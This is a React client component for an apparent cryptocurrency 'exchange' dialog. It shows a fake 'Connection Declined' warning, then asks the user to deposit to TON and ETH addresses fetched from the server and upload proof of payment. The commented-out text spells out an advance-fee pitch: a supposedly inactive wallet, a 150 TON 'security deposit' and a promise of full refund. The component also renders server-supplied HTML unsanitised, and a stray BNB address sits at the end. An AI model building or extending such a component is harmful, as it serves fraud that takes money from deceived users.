"use client";

import { CopyIcon, Loader2Icon, TriangleAlertIcon } from "lucide-react";
import { useEffect, useState } from "react";
import { toast } from "sonner";

import { Button } from "@/components/ui/button";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog";
import { Separator } from "@/components/ui/separator";
import { Payment } from "@/db/schema/schema";
import UploadFile from "./upload-file";

export default function Exchange({
  payments,
  userId,
}: {
  payments: Payment;
  userId: string;
}) {
  const [openDialog, setOpenDialog] = useState(false);
  const [address, setAddress] = useState("");
  const [details, setDetails] = useState("");
  const [eth, setEth] = useState("");
  const [first, setFirst] = useState(true);
  const [payment, setPayment] = useState(payments);

  useEffect(() => {
    getAddresses();
  }, []);

  const getAddresses = async () => {
    try {
      const res = await fetch("/api/address");
      const response = await res.json();
      console.log({ response });
      if (res.ok) {
        setAddress(response?.find((v) => v?.key == "address")?.value || "");
        setDetails(response?.find((v) => v?.key == "details")?.value || "");
        setEth(response?.find((v) => v?.key == "eth")?.value || "");
      } else {
        setOpenDialog(false);
        toast.error("Unable to get addresses", {
          description: response?.message || "Something went wrong",
        });
      }
    } catch (error) {
      setOpenDialog(false);
      toast.error("Unable to get addresses", {
        description: "Something went wrong",
      });
      console.log({ error });
    }
  };

  console.log({ payment });

  return (
    <Dialog
      open={openDialog}
      onOpenChange={() => {
        setOpenDialog((prevValue) => !prevValue);
        setFirst(true);
      }}
    >
      <DialogTrigger asChild>
        <Button className="w-full">Start Exchange</Button>
      </DialogTrigger>
      {!payment && details && first ? (
        <DialogContent className="sm:max-w-[425px]">
          <DialogHeader className="sm:text-center">
            <DialogTitle>
              <TriangleAlertIcon
                size={72}
                className="mx-auto text-chart-3 py-5"
              />
              Connection Declined
            </DialogTitle>
            <DialogDescription>
              {details && <div dangerouslySetInnerHTML={{ __html: details }} />}
              <Separator className="my-3" />
              <Button onClick={() => setFirst(false)}>Click to deposit</Button>
            </DialogDescription>
          </DialogHeader>
        </DialogContent>
      ) : payment ? (
        <DialogContent className="sm:max-w-[425px]">
          <DialogHeader className="sm:text-center">
            <DialogTitle>
              <Loader2Icon
                size={72}
                className="mx-auto text-muted-foreground py-5 animate-spin"
              />
              Preparing Transaction
            </DialogTitle>
            <DialogDescription>
              Preparing transaction, Please wait...
            </DialogDescription>
          </DialogHeader>
        </DialogContent>
      ) : (
        <DialogContent className="sm:max-w-[425px] max-h-[90vh] overflow-y-auto overflow-x-hidden">
          <DialogHeader className="sm:text-center">
            <DialogTitle>Make Payment</DialogTitle>
            <DialogDescription className="text-left">
              Pay to any of the addresses below <br />
            </DialogDescription>
          </DialogHeader>
          {address && (
            <div className="space-y-1">
              <p className="text-lg font-semibold text-primary">TON Address</p>
              <span className="flex items-center gap-2">
                <p className="text font-meduim truncate p-1 rounded border-border border w-8/10 bg-card">
                  {address}
                </p>
                <Button
                  size="icon"
                  variant="secondary"
                  onClick={() => {
                    toast.success("Address copied!");
                    navigator.clipboard.writeText(address);
                  }}
                >
                  <CopyIcon />
                </Button>
              </span>
            </div>
          )}
          {eth && (
            <div className="space-y-1">
              <p className="text-lg font-semibold text-primary">ETH Address</p>
              <span className="flex items-center gap-2">
                <p className="text font-meduim truncate p-1 rounded border-border border w-8/10 bg-card">
                  {eth}
                </p>
                <Button
                  size="icon"
                  variant="secondary"
                  onClick={() => {
                    toast.success("ETH Address copied!");
                    navigator.clipboard.writeText(eth);
                  }}
                >
                  <CopyIcon />
                </Button>
              </span>
            </div>
          )}
          <Separator className="my-1.5" />
          <UploadFile
            userId={userId}
            setOpenDialog={setOpenDialog}
            setPayment={setPayment}
          />
        </DialogContent>
      )}
      {/* <DialogContent className="sm:max-w-[425px]">
        <DialogHeader className="sm:text-center">
          <DialogTitle className="mb-3">
            <TriangleAlertIcon
              size={72}
              className="mx-auto text-chart-3 py-5"
            />
            Connection Declined
          </DialogTitle>
          <DialogDescription>
            Unfortunately, your wallet is not active and its balance is not
            equal to the amount of the security deposit.
            <br />
            Please use an active wallet or top up your balance with 5% of the
            offer amount - 150.00 TON.
            <br />
            These funds may be debited from your wallet for the duration of the
            offer and will be returned in full after its completion
          </DialogDescription>
        </DialogHeader>
      </DialogContent> */}
    </Dialog>
  );
}

// bnb1ytwzvgg2n00q53fr8mhfxjykc04kp2zw9a7zek
